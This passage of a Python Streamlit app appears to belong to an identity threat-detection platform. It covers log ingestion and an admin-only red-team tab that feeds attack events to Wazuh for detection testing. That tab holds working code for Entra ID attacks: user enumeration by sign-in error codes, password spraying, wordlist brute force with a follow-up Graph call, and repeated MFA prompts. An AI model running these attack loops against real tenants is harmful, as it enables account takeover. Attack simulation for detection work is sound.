        with loading_placeholder("Loading tenant telemetry"):
            persisted_df = storage.load_events()
    except Exception:
        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    if persisted_df.empty:
        persisted_df = pd.DataFrame(columns=storage.EVENT_COLUMNS)
    st.session_state['df'] = persisted_df

if 'resolved_users' not in st.session_state:
    try:
        st.session_state['resolved_users'] = storage.load_resolved_users()
    except Exception:
        st.session_state['resolved_users'] = set()



# TAB 1: Live Log Ingestion
if not _memberships and "Live Log Ingestion" not in selected_menu:
    render_guest_preview(selected_menu)
elif "Red Team" in selected_menu and st.session_state.get("auth_role") != "Admin":
    render_guest_preview(selected_menu)
elif selected_menu == "Live Log Ingestion":
    st.header("Active Directory & Identity Logs")

    col_upload, col_reset = st.columns([4, 1])
    with col_upload:
        uploaded_file = st.file_uploader("Upload CSV Log File", type=["csv"], disabled=not _memberships or st.session_state.get("auth_role") == "Read-Only Auditor")
        if not _memberships:
            require_login("upload_preview")
    with col_reset:
        st.write("")
        st.write("")
        try:
            if _memberships and current().role == "Admin":
                with st.expander("Clear / Reset Telemetry"):
                    with st.form("confirm_telemetry_reset", clear_on_submit=True):
                        confirmed = st.checkbox("I understand this deletes workspace telemetry and resolved-account records.")
                        submitted = st.form_submit_button("Confirm reset")
                    if submitted and confirmed:
                        require("admin")
                        storage.reset_all()
                        st.session_state["df"] = pd.DataFrame(columns=storage.EVENT_COLUMNS)
                        st.session_state["resolved_users"] = set()
                        st.rerun()
                    elif submitted:
                        st.warning("Check the confirmation box before resetting telemetry.")
        except Exception:
            st.error("Reset did not complete. Reload tenant data before retrying.")

    if uploaded_file is not None:
        try:
            df = pd.read_csv(io.BytesIO(uploaded_file.getvalue()))
            if not set(storage.EVENT_COLUMNS).issubset(df.columns):
                raise ValueError("Required identity fields are missing.")
        except Exception:
            st.error("CSV must be valid UTF-8 and include: " + ", ".join(storage.EVENT_COLUMNS))
            st.stop()
        st.subheader("CSV preview")
        st.dataframe(df.head(100), width="stretch", hide_index=True)
        if st.button("Ingest CSV", disabled=st.session_state.get("auth_role") == "Read-Only Auditor", key="v2_ingest_csv"):
            if require_login(key="csv_ingest"):
                _digest = hashlib.sha256(uploaded_file.getvalue()).hexdigest()
                if st.session_state.get("ingested_csv_digest") == _digest:
                    st.info("This file was already ingested in the current session.")
                else:
                    try:
                        storage.append_events(df)
                        st.session_state['df'] = pd.concat([st.session_state['df'], df], ignore_index=True)
                        st.session_state["ingested_csv_digest"] = _digest
                        st.success(f"Ingested {len(df)} events.")
                    except Exception:
                        st.error("Telemetry persistence failed. Reload tenant data before retrying.")
    else:
        if not st.session_state['df'].empty:
            st.subheader("Current Telemetry Logs in Memory")
            st.caption("Newest events appear first.")
            live_df = st.session_state['df']
            if 'Timestamp' in live_df.columns:
                live_df = live_df.sort_values('Timestamp', ascending=False)
            else:
                live_df = live_df.iloc[::-1]
            st.dataframe(ensure_timestamp_column(live_df), width="stretch")
        else:
            st.info("Upload identity telemetry CSV logs or use the Red Team Attack Controller to generate live attack logs.")

# TAB 2: AI Threat Analysis & Auto-Fix
elif selected_menu == "Threat Response & AI Center":
    from modules.live_ui import records
    from modules.threat_center_ui import response_center
    response_center(records())

elif selected_menu == "Red Team Attack Controller":
    try:
        require("sandbox")
    except PermissionError:
        st.error("Admin access to the authorized sandbox organization is required.")
        st.stop()
    attack_engine = None
    attack_engine_error = None
    wordlist_info = None
    try:
        from modules.attack_engine import IdentityAttackEngine, USERS_FILE, PASSWORDS_FILE, generate_wordlists

        wordlist_info = generate_wordlists()
        attack_engine = IdentityAttackEngine(USERS_FILE, PASSWORDS_FILE)
        from modules.redteam_targets import controller_targets
        attack_engine.users = controller_targets(attack_engine.users, wordlist_info)

        # Müdafiəedici yoxlama: fayl geri qoyulanda kontrakta tam uyğun
        # olmaya bilər (məs. metod adı fərqli yazılıb). Bunu İNDİ aşkarlayıb
        # aydın mesaj vermək, bir hücum düyməsi basılanda dərində gizli
        # AttributeError almaqdan DAHA YAXŞIDIR.
        _required_attack_engine_attrs = ["users", "passwords", "public_app", "revoke_sign_in_sessions", "disable_account"]
        _missing_attack_engine_attrs = [a for a in _required_attack_engine_attrs if not hasattr(attack_engine, a)]
        if _missing_attack_engine_attrs:
            raise RuntimeError(
                "Attack engine interface is missing: "
                + ", ".join(_missing_attack_engine_attrs)
            )
    except ImportError as e:
        attack_engine = None
        attack_engine_error = f"Module import error: {e}"
    except RuntimeError as e:
        attack_engine = None
        attack_engine_error = str(e)
    except Exception as e:
        attack_engine = None
        attack_engine_error = f"Unexpected error: {e}"
    st.header("Red Team Attack Controller")

    if attack_engine is None:
        st.error(f"Attack engine unavailable: {_display_error(attack_engine_error or 'unknown error (modules/attack_engine.py unavailable)')}")
        st.caption(
            'Configure ARGUS_TENANT_ID, ARGUS_CLIENT_ID, and ARGUS_CLIENT_SECRET for the authorized test tenant.'
        )
        with st.expander("Required attack engine interface"):
            st.markdown(
                'Required interface: USERS_FILE, PASSWORDS_FILE; generate_wordlists(); IdentityAttackEngine(users_file, passwords_file), users, passwords, public_app, revoke_sign_in_sessions(username), disable_account(username).'
            )

    if wordlist_info and not wordlist_info["graph_fetch_ok"]:
        st.warning(
            "Identity source: local fallback. Graph discovery failed; verify test tenant credentials, permissions, and connectivity."
        )

    col_left, col_right = st.columns([1, 1])

    with col_left:
        st.subheader("Custom Attack Parameters")
        attack_vector = st.selectbox("Attack vector", ["User Enumeration", "Password Spray", "Brute Force", "MFA Fatigue", "Device Code Flow"], key="attack_vector")
        default_domain = st.text_input("Target domain", config.DOMAIN or "example.onmicrosoft.com", key="attack_domain")
        brute_requests = st.slider("Brute Force request limit", 1, 20, 5, key="brute_requests")
        mfa_iterations = st.slider("MFA iteration limit", 1, 10, 2, key="mfa_iterations")
        target_user_input = st.text_input("Target User (for Brute Force / MFA)", value=f"user2@{default_domain}")
        spray_password_input = st.text_input("Spray Password", value="", type="password")
        custom_brute_password = st.text_input(
            "Custom Brute Force Password (optional)",
            value="",
            type="password",
            help='This password is added first, before the standard wordlist.'
        )
        available_targets = max(1, len(attack_engine.users) if attack_engine else 1)
        default_target_limit = min(available_targets, max(1, int(wordlist_info["real_user_count"]))) if wordlist_info and wordlist_info.get("graph_fetch_ok") else available_targets
        max_targets_count = int(st.number_input(
            "Max Target Limit", min_value=1, max_value=available_targets, value=default_target_limit, step=1,
            help="Defaults to the live Graph user count. Increase the limit to include synthetic targets.",
        ))

        btn_enum = btn_spray = btn_brute = btn_mfa = btn_device = False

    with col_right:
        st.subheader("Live Attack Terminal Console (`attack_engine.py`)")
        terminal_placeholder = st.empty()

        terminal_placeholder.code(
            "[+] Attack Engine Initialized...\n"
            + ("[+] Tenant: connected\n" if wordlist_info and wordlist_info.get("graph_fetch_ok")
               else "[+] Tenant: connection not verified\n")
            + "[*] Ready to execute authentication attempts against Entra ID.",
            language="bash"
        )

    if st.button("Execute Selected Attack", disabled=attack_engine is None, key="execute_attack"):
        btn_enum, btn_spray, btn_brute, btn_mfa, btn_device = [attack_vector == name for name in ["User Enumeration", "Password Spray", "Brute Force", "MFA Fatigue", "Device Code Flow"]]
    _redteam_triggered = attack_engine is not None and (btn_enum or btn_spray or btn_brute or btn_mfa or btn_device)
    if _redteam_triggered and not require_login(
        key="redteam_attack", message="Admin access is required to run sandbox simulations."
    ):
        _redteam_triggered = False

    if _redteam_triggered:
        console_logs = []
        new_events = []

        if btn_enum:
            console_logs.append(f"[*] Executing User Enumeration (Max: {max_targets_count})...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            for user in attack_engine.users[:max_targets_count]:
                try:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=user, password="DummyPassword123!", scopes=["https://graph.microsoft.com/.default"]
                    )
                    err_desc = result.get("error_description", "")
                    if any(code in err_desc for code in ["AADSTS50126", "AADSTS50055", "AADSTS50053", "AADSTS7000218"]):
                        status_text = f"[+] VALID USER: {user}"
                    elif "AADSTS50034" in err_desc:
                        status_text = f"[-] INVALID USER: {user}"
                    else:
                        status_text = f"[?] RESPONSE ({user}): {err_desc[:40]}..."
                except Exception as e:
                    status_text = f"[-] FAILED (exception): {user} -> ({str(e)[:60]}...)"
                    time.sleep(1.5)

                console_logs.append(status_text)
                terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.3)

        elif btn_spray:
            if not spray_password_input:
                st.warning("Enter a Spray Password before starting this test.")
            else:
                console_logs.append(f"[*] Executing Password Spray...\n")
                terminal_placeholder.code("\n".join(console_logs), language="bash")

                for user in attack_engine.users[:max_targets_count]:
                    try:
                        result = attack_engine.public_app.acquire_token_by_username_password(
                            username=user, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                        )
                    except Exception as e:
                        res_line = f"[-] FAILED: {user} (authentication request error)"
                        console_logs.append(res_line)
                        terminal_placeholder.code("\n".join(console_logs), language="bash")
                        new_events.append({
                            "EventID": 4625,
                            "TargetUserName": user,
                            "IpAddress": "185.220.101.5",
                            "Status": "FAILED",
                            "AuthMethod": "PasswordSpray",
                            "ErrorCode": f"MSAL_EXCEPTION: {type(e).__name__}",
                            "Timestamp": datetime.utcnow().isoformat() + "Z"
                        })
                        time.sleep(1.5)
                        continue

                    if "access_token" in result:
                        res_line = f"[+] SUCCESS: {user}"
                        evt_id = 4624
                        status = "SUCCESS"
                    else:
                        res_line = f"[-] FAILED: {user}"
                        evt_id = 4625
                        status = "FAILED"

                    console_logs.append(res_line)
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    new_events.append({
                        "EventID": evt_id,
                        "TargetUserName": user,
                        "IpAddress": "185.220.101.5",
                        "Status": status,
                        "AuthMethod": "PasswordSpray",
                        "ErrorCode": result.get("error", "None"),
                        "Timestamp": datetime.utcnow().isoformat() + "Z"
                    })

                    time.sleep(0.4)

        elif btn_brute:
            console_logs.append(f"[*] Executing Brute Force against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            wordlist_sample = attack_engine.passwords[:brute_requests]
            if custom_brute_password:
                test_passwords = [custom_brute_password] + [
                    p for p in wordlist_sample if p != custom_brute_password
                ]
                console_logs.append("[*] Custom test password added.")
                terminal_placeholder.code("\n".join(console_logs), language="bash")
            else:
                test_passwords = wordlist_sample

            for pwd in test_passwords:
                try:
                    result = attack_engine.public_app.acquire_token_by_username_password(
                        username=target_user_input, password=pwd, scopes=["https://graph.microsoft.com/.default"]
                    )
                except Exception:
                    console_logs.append("[-] FAILED: authentication request error.")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1.5)
                    continue

                if "access_token" in result:
                    console_logs.append("[+] SUCCESS: Test sign-in succeeded.")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")

                    console_logs.append("\n[*] Running Post-Exploitation Reconnaissance...")
                    headers = {"Authorization": f"Bearer {result['access_token']}"}
                    resp = requests.get("https://graph.microsoft.com/v1.0/me", headers=headers)
                    if resp.status_code == 200:
                        u_data = resp.json()
                        console_logs.append(f"[+] User Info Retrieved: {u_data.get('displayName')} ({u_data.get('userPrincipalName')})")
                    break
                else:
                    console_logs.append("[-] FAILED: Test sign-in rejected.")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                time.sleep(0.5)

        elif btn_mfa:
            console_logs.append(f"[*] Executing MFA Fatigue Simulation against {target_user_input}...\n")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if not spray_password_input:
                st.warning("Enter the known test account password in Spray Password for the MFA simulation.")
            else:
                for i in range(1, mfa_iterations + 1):
                    console_logs.append(f"[*] Attempt #{i}...")
                    try:
                        result = attack_engine.public_app.acquire_token_by_username_password(
                            username=target_user_input, password=spray_password_input, scopes=["https://graph.microsoft.com/.default"]
                        )
                        first_line = "Sign-in succeeded." if "access_token" in result else "Sign-in was not completed."
                    except Exception:
                        first_line = "Authentication request error."
                    console_logs.append(f" └─ Response: {first_line[:55]}...")
                    terminal_placeholder.code("\n".join(console_logs), language="bash")
                    time.sleep(1)

        elif btn_device:
            console_logs.append("[*] Initiating OAuth Device Code Flow...\n")
            flow = attack_engine.public_app.initiate_device_flow(scopes=["https://graph.microsoft.com/.default"])
            if "user_code" in flow:
                console_logs.append("[+] Device code flow initiated. Authorization code hidden.")
            else:
                console_logs.append("[-] Device Code Flow initiation failed.")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

        if new_events:
            new_df = pd.DataFrame(new_events)
            st.session_state['df'] = pd.concat([st.session_state['df'], new_df], ignore_index=True)
            storage.append_events(new_df)

            wazuh_ok_count = 0
            wazuh_fail_count = 0
            wazuh_errors = []

            for ev in new_events:
                wazuh_ok, wazuh_result = send_to_wazuh({
                    "timestamp": datetime.utcnow().isoformat() + "Z",
                    "event_id": ev["EventID"],
                    "user": ev["TargetUserName"],
                    "source_ip": ev["IpAddress"],
                    "rule_title": "RedTeam MSAL Attack Executed",
                    "severity": "HIGH",
                    "source": "Argus-RedTeam-Engine"
                })
                if wazuh_ok:
                    wazuh_ok_count += 1
                else:
                    wazuh_fail_count += 1
                    wazuh_errors.append(f"{ev['TargetUserName']}: {wazuh_result}")

            console_logs.append(f"\n[*] Wazuh dispatch: {wazuh_ok_count} OK, {wazuh_fail_count} FAILED")
            terminal_placeholder.code("\n".join(console_logs), language="bash")

            if wazuh_fail_count == 0:
                st.success(f"Attack execution completed: {wazuh_ok_count} events written to the Argus log bridge.")
            else:
                st.error(
                    f"Attack execution completed, but {wazuh_fail_count}/{len(new_events)} "
                    f"events FAILED to reach the Argus log bridge."
                )
                with st.expander("Wazuh dispatch error details (root cause)"):
                    for err in wazuh_errors:
                        st.code(_display_error(err))
                    st.caption(
                        'Check the ingest URL, bridge service, token, tunnel, and local log permissions.'
                    )
        else:
            st.success("Attack execution completed.")

# TAB 4: Blue Team & ITDR Dashboard
else:
    from modules.live_ui import render
    with loading_placeholder("Loading workspace data"):
        render(selected_menu)
